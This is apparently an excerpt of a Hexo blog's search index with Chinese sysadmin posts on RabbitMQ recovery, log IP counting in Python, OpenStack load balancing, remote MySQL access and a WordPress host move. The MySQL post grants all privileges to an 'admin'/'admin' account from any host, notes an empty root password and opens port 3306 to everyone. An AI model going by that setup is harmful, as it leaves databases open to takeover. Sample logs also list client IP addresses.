/usr/lib/python2.7/site-packages/oslo_messaging/_drivers/impl_rabbit.py:790</span><br></pre></td></tr></table></figure></li><li><p>启动RabbitMQ的报错<br><img data-src="/images/uploads/2015/05/21.png" alt="image"></p></li><li><p>搜索关键字：Error: unable to connect to node rabbit@localhost: nodedown，找到如下解决方式</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># systemctl enable rabbitmq-server.service</span></span><br><span class="line"><span class="meta"># systemctl start rabbitmq-server.service</span></span><br><span class="line"><span class="meta"># rabbitmqctl start_app</span></span><br></pre></td></tr></table></figure><p>成功启动rabbitmq  </p></li><li><p>启动neutrou-server，openstack恢复正常</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"># systemctl <span class="keyword">start</span> neutron-<span class="keyword">server</span>.service</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openstack </tag>
            
            <tag> rabbitmq </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python从日志文件中提取出现的ip</title>
      <link href="python/get_ip_from_logfile.html"/>
      <url>python/get_ip_from_logfile.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Created on 2015年4月13日</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: Administrator</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&#x27;rootaccess.07log&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">total_count = <span class="number">0</span></span><br><span class="line">ip_array = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> eachLine <span class="keyword">in</span> fp:</span><br><span class="line">    ip =  eachLine.split(<span class="string">&quot; &quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> ip_array.has_key(ip):</span><br><span class="line">        ip_array[ip] = ip_array[ip] + <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ip_array.setdefault(ip,<span class="number">1</span>)</span><br><span class="line">    total_count = total_count + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">R=ip_array.items()</span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> R:</span><br><span class="line">    <span class="keyword">if</span> i[<span class="number">1</span>]&amp;gt;<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> i</span><br><span class="line">        num+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span> total_count</span><br><span class="line">fp.close()</span><br></pre></td></tr></table></figure><p>日志文件如下所示（160W+行），需要提取首行ip，并统计全部ip数，不包括重复的</p><figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">116.233.77.238</span> - - <span class="string">[06/Apr/2015:23:59:59 +0800]</span> <span class="string">&quot;<span class="keyword">POST</span> /api/magicboxauth HTTP/1.1&quot;</span> <span class="number">200</span> <span class="number">203</span> <span class="string">&quot;-&quot;</span> <span class="string">&quot;Apache-HttpClient/UNAVAILABLE (java 1.4)&quot;</span> <span class="string">&quot;-&quot;</span></span><br><span class="line"><span class="number">61.170.251.177</span> - - <span class="string">[06/Apr/2015:23:59:59 +0800]</span> <span class="string">&quot;<span class="keyword">POST</span> /api/magicboxauth HTTP/1.1&quot;</span> <span class="number">200</span> <span class="number">203</span> <span class="string">&quot;-&quot;</span> <span class="string">&quot;Apache-HttpClient/UNAVAILABLE (java 1.4)&quot;</span> <span class="string">&quot;-&quot;</span></span><br><span class="line"><span class="number">101.86.33.55</span> - - <span class="string">[06/Apr/2015:23:59:59 +0800]</span> <span class="string">&quot;<span class="keyword">POST</span> /api/magicboxauth HTTP/1.1&quot;</span> <span class="number">200</span> <span class="number">203</span> <span class="string">&quot;-&quot;</span> <span class="string">&quot;Apache-HttpClient/UNAVAILABLE (java 1.4)&quot;</span> <span class="string">&quot;-&quot;</span></span><br><span class="line"><span class="number">114.86.53.187</span> - - <span class="string">[06/Apr/2015:23:59:59 +0800]</span> <span class="string">&quot;<span class="keyword">POST</span> /api/magicboxauth HTTP/1.1&quot;</span> <span class="number">200</span> <span class="number">203</span> <span class="string">&quot;-&quot;</span> <span class="string">&quot;Apache-HttpClient/UNAVAILABLE (java 1.4)&quot;</span> <span class="string">&quot;-&quot;</span></span><br><span class="line"><span class="number">180.155.104.206</span> - - <span class="string">[06/Apr/2015:23:59:59 +0800]</span> <span class="string">&quot;<span class="keyword">POST</span> /api/magicboxauth HTTP/1.1&quot;</span> <span class="number">200</span> <span class="number">203</span> <span class="string">&quot;-&quot;</span> <span class="string">&quot;Apache-HttpClient/UNAVAILABLE (java 1.4)&quot;</span> <span class="string">&quot;-&quot;</span></span><br><span class="line"><span class="number">114.88.209.25</span> - - <span class="string">[06/Apr/2015:23:59:59 +0800]</span> <span class="string">&quot;<span class="keyword">POST</span> /api/magicboxauth HTTP/1.1&quot;</span> <span class="number">200</span> <span class="number">203</span> <span class="string">&quot;-&quot;</span> <span class="string">&quot;Apache-HttpClient/UNAVAILABLE (java 1.4)&quot;</span> <span class="string">&quot;-&quot;</span></span><br><span class="line"><span class="number">180.164.251.133</span> - - <span class="string">[06/Apr/2015:23:59:59 +0800]</span> <span class="string">&quot;<span class="keyword">POST</span> /api/magicboxauth HTTP/1.1&quot;</span> <span class="number">200</span> <span class="number">203</span> <span class="string">&quot;-&quot;</span> <span class="string">&quot;Apache-HttpClient/UNAVAILABLE (java 1.4)&quot;</span> <span class="string">&quot;-&quot;</span></span><br><span class="line"><span class="number">116.230.55.212</span> - - <span class="string">[07/Apr/2015:00:00:00 +0800]</span> <span class="string">&quot;<span class="keyword">POST</span> /api/magicboxauth HTTP/1.1&quot;</span> <span class="number">200</span> <span class="number">203</span> <span class="string">&quot;-&quot;</span> <span class="string">&quot;Apache-HttpClient/UNAVAILABLE (java 1.4)&quot;</span> <span class="string">&quot;-&quot;</span></span><br><span class="line"><span class="number">114.95.223.230</span> - - <span class="string">[07/Apr/2015:00:00:00 +0800]</span> <span class="string">&quot;<span class="keyword">POST</span> /api/magicboxauth HTTP/1.1&quot;</span> <span class="number">200</span> <span class="number">203</span> <span class="string">&quot;-&quot;</span> <span class="string">&quot;Apache-HttpClient/UNAVAILABLE (java 1.4)&quot;</span> <span class="string">&quot;-&quot;</span></span><br><span class="line"><span class="number">101.229.143.32</span> - - <span class="string">[07/Apr/2015:00:00:00 +0800]</span> <span class="string">&quot;<span class="keyword">POST</span> /api/magicboxauth HTTP/1.1&quot;</span> <span class="number">200</span> <span class="number">203</span> <span class="string">&quot;-&quot;</span> <span class="string">&quot;Apache-HttpClient/UNAVAILABLE (java 1.4)&quot;</span> <span class="string">&quot;-&quot;</span></span><br><span class="line"><span class="number">114.92.56.189</span> - - <span class="string">[07/Apr/2015:00:00:00 +0800]</span> <span class="string">&quot;<span class="keyword">POST</span> /api/magicboxauth HTTP/1.1&quot;</span> <span class="number">200</span> <span class="number">203</span> <span class="string">&quot;-&quot;</span> <span class="string">&quot;Apache-HttpClient/UNAVAILABLE (java 1.4)&quot;</span> <span class="string">&quot;-&quot;</span></span><br><span class="line"><span class="number">116.230.118.3</span> - - <span class="string">[07/Apr/2015:00:00:00 +0800]</span> <span class="string">&quot;<span class="keyword">POST</span> /api/magicboxauth HTTP/1.1&quot;</span> <span class="number">200</span> <span class="number">203</span> <span class="string">&quot;-&quot;</span> <span class="string">&quot;Apache-HttpClient/UNAVAILABLE (java 1.4)&quot;</span> <span class="string">&quot;-&quot;</span></span><br><span class="line"><span class="number">180.157.88.191</span> - - <span class="string">[07/Apr/2015:00:00:00 +0800]</span> <span class="string">&quot;<span class="keyword">POST</span> /api/magicboxauth HTTP/1.1&quot;</span> <span class="number">200</span> <span class="number">203</span> <span class="string">&quot;-&quot;</span> <span class="string">&quot;Apache-HttpClient/UNAVAILABLE (java 1.4)&quot;</span> <span class="string">&quot;-&quot;</span></span><br><span class="line"><span class="number">124.77.20.187</span> - - <span class="string">[07/Apr/2015:00:00:00 +0800]</span> <span class="string">&quot;<span class="keyword">POST</span> /api/magicboxauth HTTP/1.1&quot;</span> <span class="number">200</span> <span class="number">203</span> <span class="string">&quot;-&quot;</span> <span class="string">&quot;Apache-HttpClient/UNAVAILABLE (java 1.4)&quot;</span> <span class="string">&quot;-&quot;</span></span><br><span class="line"><span class="number">180.155.152.186</span> - - <span class="string">[07/Apr/2015:00:00:00 +0800]</span> <span class="string">&quot;<span class="keyword">POST</span> /api/magicboxauth HTTP/1.1&quot;</span> <span class="number">200</span> <span class="number">203</span> <span class="string">&quot;-&quot;</span> <span class="string">&quot;Apache-HttpClient/UNAVAILABLE (java 1.4)&quot;</span> <span class="string">&quot;-&quot;</span></span><br></pre></td></tr></table></figure><p>如果需要提取全部的ip地址，linux一条命令可以达到要求，但是命令不是排除日志请求中的ip</p><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"># <span class="keyword">grep</span> -Eo <span class="string">&quot;([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;&quot;</span> xxx.<span class="built_in">log</span>|<span class="keyword">sort</span>|uniq -<span class="keyword">c</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> ip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>陪伴是最长情的告白</title>
      <link href="zm/iloveyou.html"/>
      <url>zm/iloveyou.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="3df3a16a0d21fb7d54b13aded39b359be871595660679896857a4edd962b84e2">91a3f98ed694b0f3ce330b314503f443956bf74c5546a98d75029e5bd0d9012d7b7ae2ece64b88339d3d1033f14de20f62b36e27368c72bbf6b3b3632efb79aa6e017378f1f1a20c4c49c17101abcc8873ccb1ae76bc517416a0029df81f2f1511dba731abc6ce74046f80ed9388676bc690a9085016fc87dea1224aa26c32b694450eae8700d47216592576999c7c3d1b8a2187a7115ee7a2a5d07a5e041a278de5db7d3b4d8b82dec51e6b268d3d0c3f4cbdf55cb28914b460089fe3f67dc57ff522bbe24b817398b0c313fb0a2be5dfe4b1bbcb9c3fb22e5d69aa5b963f8e31601f03235b5a5fc1d16b35e66a7deac2603f12f62223c33b20b47c60ea477d2704fafe3ea6823a5397ad39b2af3f599d285f52a2e87ad7147bb1c9a53a9af2e26903bec69e6296d275c5e31dbf17184f28bd8d5609b058134c682a491e578ba44d3ac7293fae14811edc156999454917312ade834cdf171bc7ee675579b902d427d5a42e6aaadf372854ab76bdb6e4fdbefcc39d1f1bbb38b7964d19a83dd87e9599be2bca1fe657fbc26f5351caa68a0fc388c240d0867e93875fdf567186dd8ba2f1ef86de1dac2c085a03513cc09b4eb4b1df15765b6418e7304c3d35d72ecf33a437daf7f749f33bcc0dd2a7c703e9126200496f686df579c314137fd617ef519601340f4ae7628128e389dca500b8f3963677648e8675efeb5757a96040ff1871ecbe8fe05ce20a90506d931a7ffccbb729d7cef553a7ade186a956f03e8d44af69ae91ce9302b6fc5e74043d3fe38ea70be67d7f32fffcd5ac506c0fd555d3be18c78835e4e59e0cd7177fc5f9a4e5c8885cad683ab5a1a5f40344f9dacb3e2feedc4e88587419fcbc37bcc4e49ef728c788c75824831b1db5dc17d32f7d31913303f98db38ba8fc38c408bcb2fa24ac1b89d5b2f4a6d89411f8991606c3b650cd62c1786703a1a719f035912346f6bea112a00709064370e48d8bd4a2e746d8c31934687ca13d31f543567ed38e4b0b7dc0ba579d0cf625915394dea2712ee1ffa5fb139bc233cc12168935bbdec721b65e19e3a1aeaa97f85b97c1757c844a11eddab4b8d1b9dfb7d8e0c9119626f6059560631a0aa78af25c5ecf1e09d9ecd8022ad1933d530e2ae98084f959b0f8005b9c71fd57c459c1b8ecdc9c0e2066e69130d8ca2b3e380a6cb24211e04fa0360b02d7f94f5c18ccbcdb7696909a256b193849bbc37a0a00b966a13c1d3aecd9dedc07d039cfcf689292624864d235b8eadbee5347e3358ee296d7764597ef2f5cbd455dde3bf3eb4da57a4f9e762d5887df685042281fc373995eddaaedbfa9d64a09e15ef9328c781c815f2ebb000be78e4d7deb41420da15aee8dfc97da683c04e22612eff1c2b736498912c86e2636a1166eedc669b300b641089b7b69cf1510bac0ab50ac6a81abc73b4013977e87be3e1e1fabe9202b067e0ec07b373f5b3e7c93dff5e46d8fb5f01beea94a21b39fb06e41856ab91ba80202bc13c86604338328ffdca53d89c754f1f5c847b2fc5995041b605f6e3e38fd8eee5c74eb831191028fa46019850aaefa600e93ed53ff8acd4586eeba9e8b30be86154c5e7a19f4efa3df100e10089d2fa8700d3af0edd9e1b362e1db2038cea74a91bbe0cf2e9197ac572bb026aaaeaef65264fbea20eb826092d2d7a12f68b88a8addd70f26d52d57f382a6bbc662375e712ea94d1cbcb552b550924e41d0a6af5bfaa3adb113912e02b45befe45f3c9315c3d4da50d8c62f74a60fda0db70d3478d9afde0152bab6c57268090d5715d3433d977718888ef8ff2fbd3a8d9c426672e4d931da559ded3be1240d89de229e8a126e2d596729ec026ac3bb0559ea84a0598d1888e5d50cb96dd7618bb70e2a58681f1af46bca7d5379b9b13cafaa610a78be9eeb69e3d2b4646d55d13fd5d7856bbdbdcef5d4326f872bd1493105b5468207ce88f3c342c37a21e8587b0bc5ab308431c386ff575d27a03f5cb3416f0bd9c2d64fcd36dcabc1766c835a9af752a5a8dca349f0479bfe056b88b129e595851c54fa8fa189fbbc1f45a15103b4c6c16e8249d023679207b56e4dfa74b9f85ffe961d2c8a3d0f53d77011df95ebdfd4e4d32e0ca41a5ecb256e8cf947ce7c88eb04275ea61727181c758e3ec6ad2871a17f92a2b552cd25333837ec948c916c174811091626ee3ef4dbee2c711063346d1aeed966727f1c3a398a6639291e5291d7d2c0f4a934174073b6fe75a4837ea1a2a55f26e8e77d6a5b3e1e1fae0ede8281b3cd3aef0330871c2063b4fa0c80c3098c99fb1306a1911458d87e538342caecedc5ce2b0182884d1ba2645c89914c237dc4593a529b10075b3ddc86cac9a318ecbbf24866e7da7a1c9c5aca689160016cd7d32f260ce7a3c85ceb28af2d810f9b7ebd9e81fe2b43d5cde6d522eaf02be66e4e3a6925fc218c2da7b8e2dee5fa657007115e5c85ff92beb32f0a3a684c087e372a1fb160cd651a47270ba5be79b493e3e2aa32585a9c68fee989210499a83b33caed0b9611d306c888cf8aaa31f5ccf84874d651f034b4ebbbd1448f4e9844867b2efe02765beacca17da8f884a4ce7b1dca5cddfb3a27017669aa1785366bdbd730b5d5119fbe384fe31c45a66ed05fbdf6191d000c058d233f3960f4288ac080f0e239fe70c695171c3f7a3fd8a4c0488a44a38f6ae4cbdeaaceef4a9290e9563501a3de2b86d9a49ce75e0b1b08377008fcc0a5eb97b788fb90a46b9c1226a20debf6ee44a394abb6b6e81823532ef2dfda0451ac593407000906cd37c29e31645f0c86aa63d2ec7dc26766f03bce09fafc79a3001ffcd82fcf1d509760c5ed78db35b86231702bb3d9ba7ef634c616419637852826e8b9e2565e229896b6d4f43ace5fefcff4e22754dfb78b69a5613b2f6890c28d34357c727c5c549ba70440b6106c778a13eb79efabaccff48fed41058ca7add9973ffa967e87467b53b0ec9b8b4767cf6c9e4715a0d587f44271dff5151c8c3b842849c9097a733f9c04691b844d7187262f7036ace4419bcc7314ada90c2007f6aca1970241ea586d6d45f63c3e3a1e0f7ec307859b21e538dc0090b48b343414799d011ebfa13621341e863afd8188607fc3a33dead0e0fcbe63319e0fbf9b87ac78c3c0625b392975ef17e43c44e6e6a806f9c33972db1f60329a270c6d5227bcc2d42f8332cd61ec3d4166a7f849757b2c837127d4b3e62b80809f253330c68d6a24726ddf7776abe98582fdfbcb5a662e2a0753e676a74cb17652446587e4e052bc2f83b36c938fb3e682a7b8fd14bd74a01c3ef657699663c4a85cdbe986a3d77d70cbd0e298fec0ad1b2d95f837302a9c4e88a8ffb17ebb87a33b9b1fbe479f55b11847b992f2a1bc0847f04c503863392663dc41ad64294590961380cccf1954456ac1858f8bc12136ae4d9d171700d726158c3ce77d519f63c72b9e2ed12dc06edcae4e9e555c057bebbe9ac958034d2d4668003a7bc86d164f06e7f1a8ed42b933e2dc5fd8f3ed807ac3164532e88ce9427645ffd3cdb76dda50245e41e4fa5777bd46d8326fe91464fd43d19299c9c45472e04ec6737f8b1398e43959ef3fc08687ec363b670577f04aea03633eca334290bb8d46d27528dd589574eec67a0b2e921997665ec5ec5776455b512d4a045e550196c4a0c074d8e9e933c9763765b901efca33a067d57721695ecc0d7f110d98bbec9e5a0eb48beec66dcba4f57426a1f3def39a3081797c28b34ed627d9a4fe6e88b2c42b2f687243a9f683bb8de465429ef20994c2cdcb8c302bac90cd047c5544e85ea29ab53ef7df0838434e954de932c6bb60f6a1a4bfd5cb110e06cd95ff80e51faf02c8474586edf27771abcd532972cede4aae2effca00875b37e01120caf661dfcc3a1679321167f0a046c66b5c714abffed540c4c10e0f685201a309aa1bf91b708433ca2ee644354f8264186dad42e391888588198a90c6f75dda5aa60b21ea1be72c155c90dc814094463b5f4006837ca1d52c4d7ed7cfb57f12efce4071d5e92403aa9cba52a118c543b2e568a902edce8d918f6aea57d02109856376d6f99d6ec4823f9238ee64cb6d43739f846df6877977f68bc51a167297a4040810cdca56c1465a90cc676999d9205b06ce6575a101468a7263240faa5c6958b17e2bf8be9c84ca86ce6dda22484c7138ef68f891c32f55a0acb54168ad9c9695a7a891ee14a99b835fef3a7055759b8278e4495cf67ba7b14bd236b46c7ccab3bec1e179c8b2f39d8ba03de085d11a05835fc37e69c750d836c1402e1baf7edcf09db7e9f5ef5f7683538e75dc1d44d98afdccf45776cda3bee15ef1215611e3581c7dda160acfab21fd353043e8d24fcbcf62c9596d1310ac6ddc579072417514f029e7751b0a75ba40982064c3598300b0603460cdd4d2e9d891854c45371aa7951d5a834f981c9dc141a9dc7bfd5bc181f0757c14fbe40c0de6326492b7817603ecdef7dbe574ab4b1875aa1d13872690bb6b3b81b164016faad5c186b83f7eb60e446b4c0f632e0b0b5975ebe4965c881e3920aecbb946715f885f9bfbfcf0cb9297253ed13682b3decc9cb840c349bb0366b8ab51c3635d1e7c727d3bdaba8dee775e9298f007bb3e517152e11a24f4da509899a634a73b85f8344ff707d02095bb8a5faa8ee7c01e5981e91125d8b9124ebf0e5ae539b4a0a9e5c00a0843d4c0649d4c11b441090864698a46ab8ffeccceede4f5fbd9099ccdb3f790dc4fbe5969d96152348d1f7cbd143a5dcc3bd36eb131b39041efb81b74f785871b34092b704d963fc40fd269b7c28e0ed87128328cf4cf258f05309c36ff5ed1f3633c174849644f5b50aab3b09704c1dc4a5cf882fc4e1de477ba458836e6d91e86a8ac7f6322c94d53310b932126a1905fbac9b9540ee77ea5675e07bd9d97ccd966ffb764509547660cf48c27f8c5b86eb4bb34f3283112ada1e9269776ae043bdaed3e080a0da771438bf3abd33fdaf8b3fc55a0d33fddbe04cd941a256e6f223ccae82619288cfd5efca905790187a79ad0559362bb58476a9913951b8ac0f47473de752a9fe9bb90fd3096ccf4b1e31b193df04199f4dab1ffab624c84384e4751dd948a5c2b31f9d2e1fdb3faf1dccf0780206e3ae432e615125353c06fb3913bfb18c519f6c52f0d8c2ea9aedfb9c38f5a23b246d92bb5e5cac11372ce33ae47df4a6b534993a33f15f11eb86cddd4919c2994</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> zm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>openstack icehouse负载均衡配置</title>
      <link href="openstack/openstack-icehouse-load-balance.html"/>
      <url>openstack/openstack-icehouse-load-balance.html</url>
      
        <content type="html"><![CDATA[<h2 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h2><p><img data-src="/images/uploads/2015/05/11.png" alt="image"><br>其中10.0.0.0/24是服务器网络，192.168.40.0/24是负载均衡的网络，172.16.85.160/27是公网地址。三台服务器均运行tomcat服务</p><h2 id="创建和配置负载均衡器"><a href="#创建和配置负载均衡器" class="headerlink" title="创建和配置负载均衡器"></a>创建和配置负载均衡器</h2><h3 id="1-创建一个pool-资源池"><a href="#1-创建一个pool-资源池" class="headerlink" title="1. 创建一个pool(资源池)"></a>1. 创建一个pool(资源池)</h3><p>打开网络-负载均衡-新增资源池<br><img data-src="/images/uploads/2015/05/2.png" alt="image"></p><h3 id="2-设置vip"><a href="#2-设置vip" class="headerlink" title="2. 设置vip"></a>2. 设置vip</h3><p>点击新建的资源池后面的更多选项，选择添加vip<br><img data-src="/images/uploads/2015/05/3.png" alt="image"><br>需要说明的是juno已经支持在此页面给vip绑定floating ip.</p><h3 id="3-增加成员"><a href="#3-增加成员" class="headerlink" title="3. 增加成员"></a>3. 增加成员</h3><p>选择“成员”选项卡，点击“新增成员”，添加3台服务器<br><img data-src="/images/uploads/2015/05/4.png" alt="image"></p><span id="more"></span><h3 id="4-增加监控"><a href="#4-增加监控" class="headerlink" title="4. 增加监控"></a>4. 增加监控</h3><p>选择“监控”选项卡，点击“新增监控”<br><img data-src="/images/uploads/2015/05/5.png" alt="image"></p><h3 id="5-关联监控"><a href="#5-关联监控" class="headerlink" title="5. 关联监控"></a>5. 关联监控</h3><p>选择“资源池”选项卡，点击资源池后面的更多，选择“关联监控选项”，选择我们创建的监控<br><img data-src="/images/uploads/2015/05/6.png" alt="image"><br>因为我已经关联了，所以上图显示的是解除关联</p><h2 id="为vip绑定floating-ip"><a href="#为vip绑定floating-ip" class="headerlink" title="为vip绑定floating ip"></a>为vip绑定floating ip</h2><h3 id="1-创建floating-ip"><a href="#1-创建floating-ip" class="headerlink" title="1. 创建floating ip"></a>1. 创建floating ip</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">neutron <span class="built_in">float</span>ingip-create <span class="keyword">public</span>    #pubic为外网</span><br></pre></td></tr></table></figure><p><img data-src="/images/uploads/2015/05/7.png" alt="image"></p><h3 id="2-查找vip的端口id"><a href="#2-查找vip的端口id" class="headerlink" title="2. 查找vip的端口id"></a>2. 查找vip的端口id</h3><p>点击资源池后面的vip，查看其端口id<br><img data-src="/images/uploads/2015/05/8.png" alt="image"></p><h3 id="3-绑定floating-ip"><a href="#3-绑定floating-ip" class="headerlink" title="3. 绑定floating ip"></a>3. 绑定floating ip</h3><p>使用以下命令绑定vip和floating ip，前面是floating ip的id，后者是vip的端口id</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">neutron</span> floatingip-associate  <span class="number">0</span>b<span class="number">124556</span>-<span class="number">38</span>f<span class="number">5</span>-<span class="number">4</span>d<span class="number">0</span>c-b<span class="number">71</span>c-<span class="number">32292</span>ebff<span class="number">0</span>ee  b<span class="number">688</span>d<span class="number">6</span>c<span class="number">8</span>-d<span class="number">0</span>c<span class="number">6</span>-<span class="number">4</span>d<span class="number">49</span>-<span class="number">91</span>d<span class="number">4</span>-d<span class="number">08</span>fd<span class="number">4</span>d<span class="number">2856</span>b</span><br></pre></td></tr></table></figure><p><img data-src="/images/uploads/2015/05/9.png" alt="image"></p><h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>访问vip的floating ip会轮循到三台tomcat服务器（我在不同的服务器部署了不同的内容），如下图<br><img data-src="/images/uploads/2015/05/10.png" alt="image"><br><img data-src="/images/uploads/2015/05/112.png" alt="image"><br><img data-src="/images/uploads/2015/05/12.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openstack </tag>
            
            <tag> loadbalance </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>远程访问openstack 数据库</title>
      <link href="openstack/remote-access-to-openstack-database.html"/>
      <url>openstack/remote-access-to-openstack-database.html</url>
      
        <content type="html"><![CDATA[<h3 id="1-登录数据库-创建用户"><a href="#1-登录数据库-创建用户" class="headerlink" title="1. 登录数据库 创建用户"></a>1. 登录数据库 创建用户</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">mysql -u root   #直接回车 空密码</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;admin&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;admin&#x27;</span>;   #创建<span class="keyword">admin</span>用户密码为<span class="keyword">admin</span></span><br></pre></td></tr></table></figure><h3 id="2-修改admin权限，允许远程访问"><a href="#2-修改admin权限，允许远程访问" class="headerlink" title="2. 修改admin权限，允许远程访问"></a>2. 修改admin权限，允许远程访问</h3><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">use mysql;      <span class="comment">#此DB存放MySQL的各种配置信息</span></span><br><span class="line">select host,<span class="keyword">user</span> <span class="title">from</span> user;    <span class="comment">#查看用户的权限情况</span></span><br></pre></td></tr></table></figure><p><img data-src="/images/uploads/2015/05/mysql.png" alt="image"><br>localhost表示只能本机访问<br>执行以下命令</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Grant</span> <span class="keyword">all</span> <span class="keyword">privileges</span> <span class="keyword">on</span> *.* <span class="keyword">to</span> <span class="string">&#x27;admin&#x27;</span>@<span class="string">&#x27;%&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">with</span> <span class="keyword">grant</span> <span class="keyword">option</span>;</span><br><span class="line">flush <span class="keyword">privileges</span>;</span><br></pre></td></tr></table></figure><p>“%” 表示是所有的外部机器，如果指定某一台机，就将%改为相应的机器名；’root’则是指要使用的用户名</p><h3 id="3-添加iptables规则-允许3306端口"><a href="#3-添加iptables规则-允许3306端口" class="headerlink" title="3. 添加iptables规则 允许3306端口"></a>3. 添加iptables规则 允许3306端口</h3><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># iptables -I INPUT -p tcp --dport 3306 -j ACCEPT</span></span><br><span class="line"><span class="meta"># iptables-save</span></span><br></pre></td></tr></table></figure><h3 id="4-使用MySQL-Front等工具远程访问数据库"><a href="#4-使用MySQL-Front等工具远程访问数据库" class="headerlink" title="4. 使用MySQL-Front等工具远程访问数据库"></a>4. 使用MySQL-Front等工具远程访问数据库</h3>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openstack </tag>
            
            <tag> database </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>将站点从免费空间hostinger迁到万网主机遇到的一些问题</title>
      <link href="life/move-site-from-hostinger-to-wwwnet.html"/>
      <url>life/move-site-from-hostinger-to-wwwnet.html</url>
      
        <content type="html"><![CDATA[<h3 id="1-导入备份的数据库报错"><a href="#1-导入备份的数据库报错" class="headerlink" title="1. 导入备份的数据库报错"></a>1. 导入备份的数据库报错</h3><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="meta">#1273 - Unknow collation: <span class="string">&#x27;utf8mb4_unicode_cli&#x27;</span></span></span><br></pre></td></tr></table></figure><p><img data-src="/images/uploads/2015/05/1.png" alt="image"><br>hostinger使用的mysql版本支持utf8mb4,而万网使用的mysql版本低一些不支持，使用notepad++打开备份的sql文件，将其中的utf8mb4全部替换成utf8就可以成功导入了。</p><h3 id="2-多媒体不显示以前上传的图片，上传图片也显示http错误。"><a href="#2-多媒体不显示以前上传的图片，上传图片也显示http错误。" class="headerlink" title="2. 多媒体不显示以前上传的图片，上传图片也显示http错误。"></a>2. 多媒体不显示以前上传的图片，上传图片也显示http错误。</h3><p>猜想可能是路径的错误，打开设置–多媒体，看到里面默认的上传路径是hostinger的绝对路径，而不是万网的。可是我改成万网主机的相对路径wp-content/uploads依旧无效，可是我也不知道万网主机的绝对路径，后来想起来WP super cache插件好像可以读到这个路径写入wp-config.php，打开wp-config.php，看到如下项：<br><img data-src="/images/uploads/2015/05/111.png" alt="image"><br>把默认上传路径改成/data/home/xxxxxx/htdocs/wp-content/uploads 问题解决</p><span id="more"></span><h3 id="3-二级域名的问题"><a href="#3-二级域名的问题" class="headerlink" title="3. 二级域名的问题"></a>3. 二级域名的问题</h3><p>万网提供的免费主机似乎没有提供二级域名，可以通过万网的域名解析实现类似的功能。我有一个二级网站在根目录的iloveyou文件夹里面，当然可以通过 <a href="http://www.sunmite.com/iloveyou">http://www.sunmite.com/iloveyou</a><br>访问，后来我在阿里云解析里面发现了一个隐性URL的解析项看描述可以实现二级域名的效果。<br><img data-src="/images/uploads/2015/05/1111.png" alt="image"><br>添加如下解析：<br><img data-src="/images/uploads/2015/05/11111.png" alt="image"><br>等待DNS刷新,实现效果如下：<br><a href="http://iloveyou.sunmite.com/">http://iloveyou.sunmite.com</a><br><img data-src="/images/uploads/2015/05/1112.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> hostinger </tag>
            
